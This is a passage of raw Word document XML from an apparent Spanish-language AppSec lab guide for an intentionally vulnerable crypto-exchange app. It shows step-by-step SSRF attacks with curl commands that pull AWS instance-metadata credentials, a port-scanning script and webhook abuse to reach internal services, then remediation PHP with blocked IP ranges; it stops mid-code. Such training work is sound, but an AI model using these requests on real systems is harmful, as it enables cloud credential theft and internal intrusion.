        <w:t xml:space="preserve">    "file_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "file_content": "ec2-role-cryptovulnx",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "effective_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Obtener las credenciales temporales de AWS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_type": "passport",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "file_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-cryptovulnx"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "file_content": "{\"Code\":\"Success\",\"AccessKeyId\":\"AKIAIOSFODNN7EXAMPLE\",\"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\"Token\":\"FwoGZXIvYXdzE...\",\"Expiration\":\"2026-03-28T18:00:00Z\"}",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "effective_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-cryptovulnx"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 2: Escaneo de Puertos Internos via KYC Upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Escanear el puerto de MySQL (3306).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_type": "id_card",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "file_url": "http://localhost:3306/"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada (el servidor MySQL responde con su banner):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "file_content": "5.7.38-0ubuntu0.18.04.1\u0000...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "content_type": "application/octet-stream",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http_code": 0,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "error_detail": "Received HTTP code 0 from proxy after CONNECT"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Escanear multiples puertos internos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># port_scan_ssrf.sh - Escaneo de puertos via SSRF</w:t>
        <w:br/>
        <w:br/>
        <w:t>TOKEN="&lt;tu_token_jwt&gt;"</w:t>
        <w:br/>
        <w:t>PORTS=(80 443 3306 6379 5432 8080 8443 9200 27017 11211)</w:t>
        <w:br/>
        <w:br/>
        <w:t>for PORT in "${PORTS[@]}"; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RESP=$(curl -s -o /dev/null -w "%{http_code}" -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -d "{\"document_type\":\"id_card\",\"file_url\":\"http://127.0.0.1:${PORT}/\"}" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      --max-time 5)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    echo "Puerto $PORT -&gt; HTTP Response: $RESP"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Escanear Redis (puerto 6379).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_type": "id_card",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "file_url": "http://127.0.0.1:6379/"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 3: Acceso a Servicios Internos via Webhook</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Registrar un webhook apuntando a un servicio interno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "action": "create",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "event": "swap_completed",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "webhook_url": "http://127.0.0.1:8080/admin/status"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "webhook_id": 15,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Webhook registrado correctamente"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Probar el webhook para obtener la respuesta del servicio interno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "action": "test",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "webhook_id": 15</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "test_result": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "http_code": 200,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "response_body": "{\"server\":\"internal-admin-panel\",\"version\":\"2.1.0\",\"db_host\":\"10.0.1.50\",\"db_name\":\"cryptovulnx_prod\",\"active_users\":1542,\"uptime\":\"47 days\"}",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "effective_url": "http://127.0.0.1:8080/admin/status",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "content_type": "application/json",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "response_time_ms": 12</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Explorar otros servicios internos cambiando la URL del webhook.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Acceder a Elasticsearch interno</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "action": "create",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "event": "deposit",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "webhook_url": "http://10.0.1.100:9200/_cat/indices"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Probar</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "action": "test",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "webhook_id": 16</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "test_result": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "http_code": 200,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "response_body": "green open transactions  5 1 1250000 0 2.1gb 1.0gb\ngreen open user_logs    5 1  890000 0 1.5gb 750mb\ngreen open audit_trail  5 1  450000 0 800mb 400mb",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "effective_url": "http://10.0.1.100:9200/_cat/indices",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "content_type": "text/plain"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Validacion de URLs con Lista Blanca de Dominios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// helpers/url_validator.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>function validateExternalUrl(string $url): bool {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $parsed = parse_url($url);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if (!$parsed || !isset($parsed['host'])) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return false;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $host = strtolower($parsed['host']);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Solo permitir esquemas HTTP y HTTPS</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $allowed_schemes = ['http', 'https'];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!in_array(strtolower($parsed['scheme'] ?? ''), $allowed_schemes)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return false;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Resolver el hostname a IP para detectar redireccion a IPs internas</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $resolved_ip = gethostbyname($host);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Bloquear IPs privadas y reservadas</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $blocked_ranges = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '127.0.0.0/8',       // Loopback</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '10.0.0.0/8',        // Privada Clase A</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '172.16.0.0/12',     // Privada Clase B</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '192.168.0.0/16',    // Privada Clase C</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '169.254.0.0/16',    // Link-local (metadatos cloud)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '0.0.0.0/8',         // Red actual</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'fc00::/7',          // IPv6 privada</w:t>
        <w:br/>
        <w:t xml:space="preserve">        '::1/128',           // IPv6 loopback</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    foreach ($blocked_ranges as $range) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (ipInRange($resolved_ip, $range)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return false;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Lista blanca de dominios permitidos (opcional)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $allowed_domains = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'storage.googleapis.com',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        's3.amazonaws.com',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'cdn.cryptovulnx.com'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $domain_allowed = false;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    foreach ($allowed_domains as $allowed) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ($host === $allowed || str_ends_with($host, '.' . $allowed)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            $domain_allowed = true;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    return $domain_allowed;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>function ipInRange(string $ip, string $range): bool {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (strpos($range, '/') === false) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return $ip === $range;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    list($subnet, $mask) = explode('/', $range);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $ip_long = ip2long($ip);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $subnet_long = ip2long($subnet);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($ip_long === false || $subnet_long === false) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return false;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $mask_long = -1 &lt;&lt; (32 - (int)$mask);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return ($ip_long &amp; $mask_long) === ($subnet_long &amp; $mask_long);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Aplicar Validacion en el Endpoint KYC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// kyc/upload.php - Corregido</w:t>
        <w:br/>
        <w:br/>
        <w:t>require_once __DIR__ . '/../helpers/url_validator.php';</w:t>
        <w:br/>
        <w:br/>
        <w:t>$file_url = $data['file_url'] ?? null;</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($file_url) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!validateExternalUrl($file_url)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "error" =&gt; "URL no permitida. Solo se aceptan URLs de dominios autorizados.",</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "allowed_domains" =&gt; ["storage.googleapis.com", "s3.amazonaws.com", "cdn.cryptovulnx.com"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Descargar con restricciones adicionales</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $ch = curl_init($file_url);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_TIMEOUT, 10);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_MAXFILESIZE, 5 * 1024 * 1024); // Max 5MB</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // No seguir redirecciones</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS); // Solo HTTPS</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $content = curl_exec($ch);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_close($ch);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($http_code !== 200) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "No se pudo descargar el archivo"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. No Devolver el Cuerpo de Respuesta en Webhooks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// webhook/notify.php - Corregido</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($action === 'test') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Validar URL del webhook antes de hacer la solicitud</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!validateExternalUrl($webhook['url'])) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "URL del webhook no permitida"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
